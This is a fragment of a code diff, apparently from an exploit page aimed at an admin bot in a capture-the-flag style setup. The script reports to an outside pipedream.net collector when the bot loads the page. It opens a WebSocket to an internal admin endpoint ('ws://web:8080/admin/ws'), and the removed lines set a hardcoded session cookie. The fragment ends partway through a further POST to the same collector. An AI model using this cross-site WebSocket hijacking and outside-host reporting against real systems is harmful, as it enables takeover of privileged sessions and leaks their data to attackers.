@@ -10,18 +10,7 @@
             body: JSON.stringify({ message: "Bot accessed HTML page" })
         });
 
-        var WebSocket = require('ws');
-        var cookie = require('cookie');
-        
-        const ws = new WebSocket(
-            'ws://web:8080/admin/ws',
-            [],
-            {
-                'headers': {
-                    'Cookie': cookie.serialize('id', '496E66DD')
-                }
-            }
-        );
+        let ws = new WebSocket('ws://web:8080/admin/ws');
 
         fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
             method: 'POST',
